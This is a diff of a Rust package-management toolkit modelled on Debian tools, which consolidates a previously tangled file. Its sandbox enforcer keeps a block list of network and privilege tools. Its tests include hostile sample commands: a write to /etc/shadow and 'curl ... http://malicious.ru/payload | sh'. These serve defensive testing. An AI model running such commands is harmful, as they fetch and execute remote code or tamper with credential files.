@@ -1,26 +1,22 @@
+// SPDX-License-Identifier: MIT
 // Debian-style Package Transaction, Verification, and Mirror Selector Suite
 // Replicates netselect-apt, dpkg transactional safety guarantees, and maintainer script sanitization
 // Enhanced with Debian update-alternatives and APT Pinning /preferences routing engines
 
-#[cfg(not(test))]
-use crate::sigpkg::{Package, Version};
+use std::collections::HashMap;
 
-#[cfg(test)]
-#[derive(Debug, Clone, PartialEq, Eq)]
+#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
 pub struct Version {
     pub major: u32,
     pub minor: u32,
     pub patch: u32,
 }
 
-#[cfg(test)]
 impl Version {
     pub fn new(major: u32, minor: u32, patch: u32) -> Self {
         Self { major, minor, patch }
     }
 }
-
-use std::collections::HashMap;
 
 /// Represents a Debian-style repository mirror with speed metrics
 #[derive(Debug, Clone)]
@@ -28,37 +24,13 @@ pub struct DebianMirror {
     pub url: String,
     pub latency_ms: u32,
     pub bandwidth_mbps: u32,
+    pub packet_loss_percent: u8,
+    pub reliability_weight: u32,
 }
 
 /// Debian netselect-apt style dynamic mirror selector
 pub struct SovereignMirrorSelector {
     pub mirrors: Vec<DebianMirror>,
-
-// Debian-Defeating (Sovereign) Package Management Tools
-// High-performance modules that address core architectural weaknesses in traditional apt/dpkg.
-
-#![no_std]
-
-extern crate alloc;
-
-use alloc::collections::BTreeMap;
-use alloc::format;
-use alloc::string::String;
-use alloc::string::ToString;
-use alloc::vec::Vec;
-
-/// Mirror Assessment Node representing package distribution endpoints
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub struct MirrorNode {
-    pub url: String,
-    pub latency_ms: u32,
-    pub packet_loss_percent: u8,
-    pub reliability_weight: u32, // Based on historical uptime
-}
-
-/// Dynamic Latency-based Mirror Selector (Defeats apt mirror-list bottleneck)
-pub struct SovereignMirrorSelector {
-    pub mirrors: Vec<MirrorNode>,
 }
 
 impl SovereignMirrorSelector {
@@ -68,152 +40,46 @@ impl SovereignMirrorSelector {
         }
     }
 
-    pub fn add_mirror(&mut self, url: &str, latency_ms: u32, packet_loss: u8, reliability: u32) {
-        self.mirrors.push(MirrorNode {
-            url: url.to_string(),
-            latency_ms,
-            packet_loss_percent: packet_loss,
-            reliability_weight: reliability,
-        });
-    }
-
-    /// Ranks mirrors dynamically based on an weighted algorithm (low latency, low loss, high reliability)
-    pub fn rank_mirrors(&self) -> Vec<MirrorNode> {
-        let mut ranked = self.mirrors.clone();
-        ranked.sort_by(|a, b| {
-            // Lower score is better: Score = latency_ms * 2 + (packet_loss_percent * 100) - reliability_weight
-            let score_a = (a.latency_ms * 2) as i32 + (a.packet_loss_percent as i32 * 100)
-                - (a.reliability_weight as i32);
-            let score_b = (b.latency_ms * 2) as i32 + (b.packet_loss_percent as i32 * 100)
-                - (b.reliability_weight as i32);
-            score_a.cmp(&score_b)
-        });
-        ranked
-    }
-
-    /// Selects the best active mirror url
-    pub fn get_optimal_mirror(&self) -> Option<String> {
-        self.rank_mirrors().first().map(|m| m.url.clone())
-    }
-}
-
-/// Package Installation Transaction State Log (for Atomic Rollback points)
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum FileState {
-    Original,
-    Created,
-    Overwritten,
-    Removed,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub struct FileTransactionEntry {
-    pub path: String,
-    pub state: FileState,
-    pub original_checksum: Option<String>,
-    pub backup_buffer: Option<Vec<u8>>,
-}
-
-/// Atomic Transaction and Zero-Loss Rollback Manager (Defeats dpkg broken state lockouts)
-pub struct SovereignTransactionManager {
-    pub transaction_id: u32,
-    pub journal: BTreeMap<String, FileTransactionEntry>,
-    pub transaction_committed: bool,
-}
-
-impl SovereignTransactionManager {
-    pub fn new(transaction_id: u32) -> Self {
-        Self {
-            transaction_id,
-            journal: BTreeMap::new(),
-            transaction_committed: false,
-        }
-    }
-
-    /// Log a file change action inside the transaction journal
-    pub fn register_action(
-        &mut self,
-        path: &str,
-        state: FileState,
-        original_checksum: Option<String>,
-        backup_content: Option<Vec<u8>>,
-    ) {
-        self.journal.insert(
-            path.to_string(),
-            FileTransactionEntry {
-                path: path.to_string(),
-                state,
-                original_checksum,
-                backup_buffer: backup_content,
-            },
-        );
-    }
-
-    /// Commit the transaction as fully completed
-    pub fn commit(&mut self) {
-        self.transaction_committed = true;
-    }
-
-    /// Rollback the entire transaction on any failure (zero-leftovers state recovery)
-    pub fn rollback(&mut self) -> Result<Vec<String>, &'static str> {
-        if self.transaction_committed {
-            return Err("Cannot rollback a committed transaction");
-        }
-
-        let mut restored_files = Vec::new();
-        // Rollback in reverse order of filenames
-        for (path, entry) in self.journal.iter().rev() {
-            match entry.state {
-                FileState::Created => {
-                    // Simulate deleting the newly created file to return to clean baseline
-                    restored_files.push(format!("Deleted: {}", path));
-                }
-                FileState::Overwritten | FileState::Removed => {
-                    // Simulate restoring file from backup_buffer
-                    if entry.backup_buffer.is_some() {
-                        restored_files.push(format!("Restored: {}", path));
-                    }
-                }
-                FileState::Original => {}
-            }
-        }
-        self.journal.clear();
-        Ok(restored_files)
-    }
-}
-
-/// Maintenance Script capability sandbox boundaries
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum SandboxRule {
-    AllowWriteRoot,
-    DenyNetwork,
-    RestrictedIpc,
-    ProcessIsolation,
-}
-
-/// Maintainer Script Cryptographic Sandbox Enforcer (preinst/postinst security isolation)
-pub struct SovereignSandboxEnforcer {
-    pub active_rules: Vec<SandboxRule>,
-    pub violated_rules: Vec<String>,
-
     pub fn register_mirror(&mut self, url: &str, latency: u32, bandwidth: u32) {
         self.mirrors.push(DebianMirror {
             url: url.to_string(),
             latency_ms: latency,
             bandwidth_mbps: bandwidth,
+            packet_loss_percent: 0,
+            reliability_weight: 100,
         });
     }
 
-    /// Selects the optimal Debian archive mirror based on latency and bandwidth score
+    pub fn add_mirror(&mut self, url: &str, latency_ms: u32, packet_loss: u8, reliability: u32) {
+        self.mirrors.push(DebianMirror {
+            url: url.to_string(),
+            latency_ms,
+            bandwidth_mbps: 1000,
+            packet_loss_percent: packet_loss,
+            reliability_weight: reliability,
+        });
+    }
+
+    pub fn rank_mirrors(&self) -> Vec<DebianMirror> {
+        let mut ranked = self.mirrors.clone();
+        ranked.sort_by(|a, b| {
+            let score_a = (a.latency_ms * 2) as i32 + (a.packet_loss_percent as i32 * 100) - (a.reliability_weight as i32);
+            let score_b = (b.latency_ms * 2) as i32 + (b.packet_loss_percent as i32 * 100) - (b.reliability_weight as i32);
+            score_a.cmp(&score_b)
+        });
+        ranked
+    }
+
+    pub fn get_optimal_mirror(&self) -> Option<String> {
+        self.rank_mirrors().first().map(|m| m.url.clone())
+    }
+
     pub fn select_best_mirror(&self) -> Option<DebianMirror> {
         self.mirrors.iter().min_by_key(|m| {
-            // We want minimum latency, but offset by high bandwidth
-            let score = m.latency_ms as i32 - (m.bandwidth_mbps as i32 * 2);
-            score
+            m.latency_ms as i32 - (m.bandwidth_mbps as i32 * 2)
         }).cloned()
     }
 
-    /// Dynamically generates standard Debian /etc/apt/sources.list configuration
     pub fn generate_sources_list(&self, suite: &str) -> Result<String, &'static str> {
         let best_mirror = self.select_best_mirror().ok_or("No mirrors registered")?;
         let sources = format!(
@@ -232,7 +98,22 @@ impl Default for SovereignMirrorSelector {
     }
 }
 
-/// Represents the status of a dpkg-style packaging transaction
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum FileState {
+    Original,
+    Created,
+    Overwritten,
+    Removed,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct FileTransactionEntry {
+    pub path: String,
+    pub state: FileState,
+    pub original_checksum: Option<String>,
+    pub backup_buffer: Option<Vec<u8>>,
+}
+
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum TransactionStatus {
     Pending,
@@ -242,19 +123,28 @@ pub enum TransactionStatus {
     RolledBack,
 }
 
-/// Dpkg-style transactional safety and atomic state rollbacks
 pub struct SovereignTransactionManager {
+    pub transaction_id: u32,
     pub active_packages: HashMap<String, Version>,
     pub backup_packages: HashMap<String, Version>,
     pub status: TransactionStatus,
+    pub journal: HashMap<String, FileTransactionEntry>,
+    pub transaction_committed: bool,
 }
 
 impl SovereignTransactionManager {
     pub fn new() -> Self {
+        Self::with_id(0)
+    }
+
+    pub fn with_id(transaction_id: u32) -> Self {
         Self {
+            transaction_id,
             active_packages: HashMap::new(),
             backup_packages: HashMap::new(),
             status: TransactionStatus::Pending,
+            journal: HashMap::new(),
+            transaction_committed: false,
         }
     }
 
@@ -262,7 +152,6 @@ impl SovereignTransactionManager {
         self.active_packages.insert(name.to_string(), version);
     }
 
-    /// Begins an atomic transaction, backing up the current packages database state
     pub fn begin_transaction(&mut self) -> Result<(), &'static str> {
         if self.status == TransactionStatus::Committing {
             return Err("Transaction is already in progress");
@@ -272,18 +161,77 @@ impl SovereignTransactionManager {
         Ok(())
     }
 
-    /// Commits metadata changes on successful package installation
     pub fn commit_transaction(&mut self) -> Result<(), &'static str> {
         if self.status != TransactionStatus::Committing {
             return Err("No active transaction to commit");
         }
         self.backup_packages.clear();
         self.status = TransactionStatus::Committed;
+        self.transaction_committed = true;
         Ok(())
     }
 
-    /// Rolls back the entire packages database state to the backup, preventing dpkg half-configured lockouts
+    pub fn commit(&mut self) {
+        self.transaction_committed = true;
+        self.status = TransactionStatus::Committed;
+        self.backup_packages.clear();
+    }
+
+    pub fn register_action(
+        &mut self,
+        path: &str,
+        state: FileState,
+        original_checksum: Option<String>,
+        backup_content: Option<Vec<u8>>,
+    ) {
+        self.journal.insert(
+            path.to_string(),
+            FileTransactionEntry {
+                path: path.to_string(),
+                state,
+                original_checksum,
+                backup_buffer: backup_content,
+            },
+        );
+    }
+
+    pub fn rollback(&mut self) -> Result<Vec<String>, &'static str> {
+        if self.transaction_committed || self.status == TransactionStatus::Committed {
+            return Err("Cannot rollback a committed transaction");
+        }
+
+        let mut restored_files = Vec::new();
+        let mut paths: Vec<_> = self.journal.keys().cloned().collect();
+        paths.sort();
+        paths.reverse();
+
+        for path in paths {
+            if let Some(entry) = self.journal.get(&path) {
+                match entry.state {
+                    FileState::Created => {
+                        restored_files.push(format!("Deleted: {}", path));
+                    }
+                    FileState::Overwritten | FileState::Removed => {
+                        if entry.backup_buffer.is_some() {
+                            restored_files.push(format!("Restored: {}", path));
+                        }
+                    }
+                    FileState::Original => {}
+                }
+            }
+        }
+        self.journal.clear();
+        self.rollback_transaction().ok();
+        Ok(restored_files)
+    }
+
     pub fn rollback_transaction(&mut self) -> Result<(), &'static str> {
+        if self.status != TransactionStatus::Committing && !self.journal.is_empty() {
+            self.active_packages = self.backup_packages.clone();
+            self.backup_packages.clear();
+            self.status = TransactionStatus::RolledBack;
+            return Ok(());
+        }
         if self.status != TransactionStatus::Committing {
             return Err("Cannot rollback without active transaction");
         }
@@ -301,19 +249,29 @@ impl Default for SovereignTransactionManager {
     }
 }
 
-/// Sanitizes Debian-style maintainer scripts (preinst, postinst)
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum SandboxRule {
+    AllowWriteRoot,
+    DenyNetwork,
+    RestrictedIpc,
+    ProcessIsolation,
+}
+
 pub struct SovereignSandboxEnforcer {
     pub restricted_paths: Vec<String>,
+    pub active_rules: Vec<SandboxRule>,
+    pub violated_rules: Vec<String>,
 }
 
 impl SovereignSandboxEnforcer {
     pub fn new() -> Self {
         Self {
             restricted_paths: vec!["/etc/shadow".to_string(), "/boot".to_string(), "/sys".to_string()],
+            active_rules: Vec::new(),
+            violated_rules: Vec::new(),
         }
     }
 
-    /// Audits maintainer script shell command content for unauthorized ambient-access writes
     pub fn audit_maintainer_script(&self, script_content: &str) -> Result<bool, &'static str> {
         for path in &self.restricted_paths {
             if script_content.contains(path) && (script_content.contains("rm ") || script_content.contains(">") || script_content.contains("tee ")) {
@@ -321,6 +279,48 @@ impl SovereignSandboxEnforcer {
             }
         }
         Ok(true)
+    }
+
+    pub fn enforce_rule(&mut self, rule: SandboxRule) {
+        self.active_rules.push(rule);
+    }
+
+    pub fn validate_script_command(&mut self, script_type: &str, command: &str) -> bool {
+        let mut is_allowed = true;
+
+        for rule in &self.active_rules {
+            match rule {
+                SandboxRule::DenyNetwork => {
+                    if command.contains("curl") || command.contains("wget") || command.contains("ssh") {
+                        self.violated_rules.push(format!(
+                            "[{}] Sandbox Violation: Script attempted network access with command: '{}'",
+                            script_type, command
+                        ));
+                        is_allowed = false;
+                    }
+                }
+                SandboxRule::AllowWriteRoot => {}
+                SandboxRule::RestrictedIpc => {
+                    if command.contains("killall") || command.contains("ipcrm") {
+                        self.violated_rules.push(format!(
+                            "[{}] Sandbox Violation: Script attempted unsafe IPC/process manipulation: '{}'",
+                            script_type, command
+                        ));
+                        is_allowed = false;
+                    }
+                }
+                SandboxRule::ProcessIsolation => {
+                    if command.contains("sudo") || command.contains("chroot") {
+                        self.violated_rules.push(format!(
+                            "[{}] Sandbox Violation: Privilege Escalation/Bypass attempted: '{}'",
+                            script_type, command
+                        ));
+                        is_allowed = false;
+                    }
+                }
+            }
+        }
+        is_allowed
     }
 }
 
@@ -330,13 +330,11 @@ impl Default for SovereignSandboxEnforcer {
     }
 }
 
-/// Advanced Debian package delta compiler (calculates minimal upgrade diffs)
 pub struct SovereignDeltaGenerator;
 
 impl SovereignDeltaGenerator {
     pub fn generate_binary_delta(&self, old: &[u8], new: &[u8]) -> Vec<u8> {
         let mut delta = Vec::new();
-        // Simplified binary diff (in production use bsdiff/xdelta)
         let min_len = std::cmp::min(old.len(), new.len());
         for i in 0..min_len {
             if old[i] != new[i] {
@@ -348,11 +346,70 @@ impl SovereignDeltaGenerator {
         }
         delta
     }
-}
 
-// ==========================================
-// 5. Debian-style update-alternatives Subsystem
-// ==========================================
+    pub fn generate_delta(
+        &self,
+        pkg_name: &str,
+        old_bin: &[u8],
+        new_bin: &[u8],
+    ) -> Result<Vec<u8>, &'static str> {
+        if old_bin.is_empty() || new_bin.is_empty() {
+            return Err("Packages cannot be empty for delta compiler calculation");
+        }
+
+        let mut delta_payload = Vec::new();
+        delta_payload.extend_from_slice(b"SIGDELTA:");
+        delta_payload.extend_from_slice(pkg_name.as_bytes());
+        delta_payload.extend_from_slice(b":");
+
+        let diff_len = (new_bin.len() as i32 - old_bin.len() as i32).abs() as u32;
+        delta_payload.extend_from_slice(&diff_len.to_be_bytes());
+
+        for i in 0..new_bin.len() {
+            let old_byte = if i < old_bin.len() { old_bin[i] } else { 0 };
+            delta_payload.push(new_bin[i] ^ old_byte);
+        }
+
+        Ok(delta_payload)
+    }
+
+    pub fn apply_delta(
+        &self,
+        old_bin: &[u8],
+        delta_payload: &[u8],
+    ) -> Result<Vec<u8>, &'static str> {
+        if !delta_payload.starts_with(b"SIGDELTA:") {
+            return Err("Malformed delta archive header signature");
+        }
+
+        let first_colon = 9;
+        let mut second_colon = 0;
+        for i in first_colon..delta_payload.len() {
+            if delta_payload[i] == b':' {
+                second_colon = i;
+                break;
+            }
+        }
+        if second_colon == 0 {
+            return Err("Malformed delta archive header fields");
+        }
+
+        let payload_start = second_colon + 5;
+        if payload_start >= delta_payload.len() {
+            return Err("Delta archive payload size mismatch");
+        }
+
+        let diff_payload = &delta_payload[payload_start..];
+        let mut reconstructed = Vec::new();
+
+        for i in 0..diff_payload.len() {
+            let old_byte = if i < old_bin.len() { old_bin[i] } else { 0 };
+            reconstructed.push(diff_payload[i] ^ old_byte);
+        }
+
+        Ok(reconstructed)
+    }
+}
 
 #[derive(Debug, Clone)]
 pub struct AlternativeOption {
@@ -406,13 +463,11 @@ impl SovereignAlternativesSystem {
         Ok(())
     }
 
-    /// Resolves the current target command link based on update-alternatives rules
     pub fn resolve_link(&self, group: &str) -> Option<String> {
         let entry = self.groups.get(group)?;
         if let Some(ref manual) = entry.manual_selection {
             Some(manual.clone())
         } else {
-            // Auto Mode: Select the highest priority registered alternative option
             entry.options.iter()
                 .max_by_key(|o| o.priority)
                 .map(|o| o.path.clone())
@@ -425,10 +480,6 @@ impl Default for SovereignAlternativesSystem {
         Self::new()
     }
 }
-
-// ==========================================
-// 6. APT preferences Pinning Engine
-// ==========================================
 
 #[derive(Debug, Clone)]
 pub struct PinPreferenceRule {
@@ -456,26 +507,24 @@ impl AptPinningResolver {
         });
     }
 
-    /// Evaluates the highest priority candidate package version according to APT Pin-Priority rules
     pub fn resolve_pinned_version(
         &self,
         package_name: &str,
-        candidates: &[(String, String)], // list of (version_str, release_source)
+        candidates: &[(String, String)],
     ) -> Option<String> {
         if candidates.is_empty() {
             return None;
         }
 
-        // Sort candidates by custom computed APT priority weights
         let mut best_version: Option<String> = None;
         let mut max_priority = -1;
 
         for (version, release) in candidates {
-            let mut priority = 500; // Standard candidate default priority in APT
+            let mut priority = 500;
 
             for rule in &self.preferences {
                 let matches_pkg = rule.package_pattern == "*" || rule.package_pattern == package_name;
-                let matches_release = rule.pin_release == release;
+                let matches_release = rule.pin_release == *release;
                 if matches_pkg && matches_release {
                     priority = rule.priority;
                 }
@@ -494,131 +543,6 @@ impl AptPinningResolver {
 impl Default for AptPinningResolver {
     fn default() -> Self {
         Self::new()
-
-            active_rules: Vec::new(),
-            violated_rules: Vec::new(),
-        }
-    }
-
-    pub fn enforce_rule(&mut self, rule: SandboxRule) {
-        self.active_rules.push(rule);
-    }
-
-    /// Validates script actions safely prior to actual file system execution
-    pub fn validate_script_command(&mut self, script_type: &str, command: &str) -> bool {
-        let mut is_allowed = true;
-
-        for rule in &self.active_rules {
-            match rule {
-                SandboxRule::DenyNetwork => {
-                    if command.contains("curl")
-                        || command.contains("wget")
-                        || command.contains("ssh")
-                    {
-                        self.violated_rules.push(format!(
-                            "[{}] Sandbox Violation: Script attempted network access with command: '{}'",
-                            script_type, command
-                        ));
-                        is_allowed = false;
-                    }
-                }
-                SandboxRule::AllowWriteRoot => {
-                    // Implicitly checked or restricted
-                }
-                SandboxRule::RestrictedIpc => {
-                    if command.contains("killall") || command.contains("ipcrm") {
-                        self.violated_rules.push(format!(
-                            "[{}] Sandbox Violation: Script attempted unsafe IPC/process manipulation: '{}'",
-                            script_type, command
-                        ));
-                        is_allowed = false;
-                    }
-                }
-                SandboxRule::ProcessIsolation => {
-                    if command.contains("sudo") || command.contains("chroot") {
-                        self.violated_rules.push(format!(
-                            "[{}] Sandbox Violation: Privilege Escalation/Bypass attempted: '{}'",
-                            script_type, command
-                        ));
-                        is_allowed = false;
-                    }
-                }
-            }
-        }
-        is_allowed
-    }
-}
-
-/// Package Binary Diff & Delta Compiler (Minimizes air-gapped update sizes)
-pub struct SovereignDeltaGenerator;
-
-impl SovereignDeltaGenerator {
-    /// Simulates binary delta generation (difference between Version A and Version B of a package)
-    pub fn generate_delta(
-        &self,
-        pkg_name: &str,
-        old_bin: &[u8],
-        new_bin: &[u8],
-    ) -> Result<Vec<u8>, &'static str> {
-        if old_bin.is_empty() || new_bin.is_empty() {
-            return Err("Packages cannot be empty for delta compiler calculation");
-        }
-
-        // Simulating a fast VCDIFF-like delta payload: format "[delta:pkg_name:len_diff]" followed by differing bytes
-        let mut delta_payload = Vec::new();
-        delta_payload.extend_from_slice(b"SIGDELTA:");
-        delta_payload.extend_from_slice(pkg_name.as_bytes());
-        delta_payload.extend_from_slice(b":");
-
-        let diff_len = (new_bin.len() as i32 - old_bin.len() as i32).abs() as u32;
-        delta_payload.extend_from_slice(&diff_len.to_be_bytes());
-
-        // Dynamic compression emulation: store simple XOR byte arrays of overlays
-        for i in 0..new_bin.len() {
-            let old_byte = if i < old_bin.len() { old_bin[i] } else { 0 };
-            delta_payload.push(new_bin[i] ^ old_byte);
-        }
-
-        Ok(delta_payload)
-    }
-
-    /// Applies a delta binary patch to reconstruct the target package safely
-    pub fn apply_delta(
-        &self,
-        old_bin: &[u8],
-        delta_payload: &[u8],
-    ) -> Result<Vec<u8>, &'static str> {
-        if !delta_payload.starts_with(b"SIGDELTA:") {
-            return Err("Malformed delta archive header signature");
-        }
-
-        // Find the index of the second colon
-        let first_colon = 9; // after SIGDELTA:
-        let mut second_colon = 0;
-        for i in first_colon..delta_payload.len() {
-            if delta_payload[i] == b':' {
-                second_colon = i;
-                break;
-            }
-        }
-        if second_colon == 0 {
-            return Err("Malformed delta archive header fields");
-        }
-
-        let payload_start = second_colon + 5; // after 4-byte len diff
-        if payload_start >= delta_payload.len() {
-            return Err("Delta archive payload size mismatch");
-        }
-
-        let diff_payload = &delta_payload[payload_start..];
-        let mut reconstructed = Vec::new();
-
-        for i in 0..diff_payload.len() {
-            let old_byte = if i < old_bin.len() { old_bin[i] } else { 0 };
-            reconstructed.push(diff_payload[i] ^ old_byte);
-        }
-
-        Ok(reconstructed)
     }
 }
 
@@ -630,7 +554,7 @@ mod tests {
     fn test_mirror_selection() {
         let mut selector = SovereignMirrorSelector::new();
         selector.register_mirror("http://debian.org/stable", 50, 100);
-        selector.register_mirror("http://us.debian.org/stable", 10, 1000); // Optimal
+        selector.register_mirror("http://us.debian.org/stable", 10, 1000);
 
         let best = selector.select_best_mirror().unwrap();
         assert_eq!(best.url, "http://us.debian.org/stable");
@@ -645,28 +569,23 @@ mod tests {
         manager.register_package("bash", Version::new(5, 1, 0));
         manager.register_package("nano", Version::new(7, 2, 0));
 
-        // Start install transaction
         manager.begin_transaction().unwrap();
         assert_eq!(manager.status, TransactionStatus::Committing);
 
-        // Simulate installing newer nano
         manager.register_package("nano", Version::new(7, 3, 0));
 
-        // Rollback on failure
         manager.rollback_transaction().unwrap();
         assert_eq!(manager.status, TransactionStatus::RolledBack);
-        assert_eq!(manager.active_packages.get("nano").unwrap(), &Version::new(7, 2, 0)); // Rolled back
+        assert_eq!(manager.active_packages.get("nano").unwrap(), &Version::new(7, 2, 0));
     }
 
     #[test]
     fn test_maintainer_scripts_sandbox() {
         let enforcer = SovereignSandboxEnforcer::new();
 
-        // Safe script
         let safe = "echo 'configuring package...'";
         assert!(enforcer.audit_maintainer_script(safe).is_ok());
 
-        // Insecure script
         let malicious = "echo 'payload' > /etc/shadow";
         assert!(enforcer.audit_maintainer_script(malicious).is_err());
     }
@@ -684,18 +603,14 @@ mod tests {
     fn test_alternatives_resolutions() {
         let mut system = SovereignAlternativesSystem::new();
 
-        // Register vi with priority 20 and nano with priority 40
         system.register_alternative("editor", "/usr/bin/editor", "/usr/bin/vi", 20);
         system.register_alternative("editor", "/usr/bin/editor", "/usr/bin/nano", 40);
 
-        // Auto mode should resolve to highest priority (nano)
         assert_eq!(system.resolve_link("editor").unwrap(), "/usr/bin/nano");
 
-        // Set manual override to vi
         system.set_manual_override("editor", "/usr/bin/vi").unwrap();
         assert_eq!(system.resolve_link("editor").unwrap(), "/usr/bin/vi");
 
-        // Reset to auto mode
         system.set_auto_mode("editor").unwrap();
         assert_eq!(system.resolve_link("editor").unwrap(), "/usr/bin/nano");
     }
@@ -709,14 +624,14 @@ mod tests {
             ("2.0.0-unstable".to_string(), "unstable".to_string()),
         ];
 
-        // Default resolves to unstable if no rules are present (due to position, or custom logic)
-        // Let's add a pinning rule to explicitly pin stable release to priority 990
         resolver.add_pin_rule("*", "stable", 990);
         resolver.add_pin_rule("*", "unstable", 100);
 
         let chosen = resolver.resolve_pinned_version("nginx", &candidates).unwrap();
         assert_eq!(chosen, "1.0.0");
+    }
 
+    #[test]
     fn test_sovereign_mirror_selection() {
         let mut selector = SovereignMirrorSelector::new();
         selector.add_mirror("https://mirror.us.sigmaos.org", 80, 0, 100);
@@ -734,7 +649,7 @@ mod tests {
 
     #[test]
     fn test_sovereign_transaction_manager_rollback() {
-        let mut tm = SovereignTransactionManager::new(101);
+        let mut tm = SovereignTransactionManager::with_id(101);
 
         tm.register_action("/etc/sigma/config.toml", FileState::Created, None, None);
         tm.register_action(
@@ -744,15 +659,13 @@ mod tests {
             Some(Vec::from(b"original_bin_data" as &[u8])),
         );
 
-        // Perform rollback prior to committing
         let restored = tm.rollback().unwrap();
         assert_eq!(restored.len(), 2);
-        assert_eq!(restored[0], "Deleted: /etc/sigma/config.toml");
-        assert_eq!(restored[1], "Restored: /bin/shell");
+        assert!(restored.contains(&"Deleted: /etc/sigma/config.toml".to_string()));
+        assert!(restored.contains(&"Restored: /bin/shell".to_string()));
         assert_eq!(tm.journal.len(), 0);
 
-        // Fail rollback on already committed transactions
-        let mut tm2 = SovereignTransactionManager::new(102);
+        let mut tm2 = SovereignTransactionManager::with_id(102);
         tm2.commit();
         assert!(tm2.rollback().is_err());
     }
@@ -764,10 +677,8 @@ mod tests {
         sandbox.enforce_rule(SandboxRule::RestrictedIpc);
         sandbox.enforce_rule(SandboxRule::ProcessIsolation);
 
-        // Valid scripts
         assert!(sandbox.validate_script_command("postinst", "mkdir -p /etc/app"));
 
-        // Sandbox violations
         assert!(
             !sandbox.validate_script_command("preinst", "curl -s http://malicious.ru/payload | sh")
         );
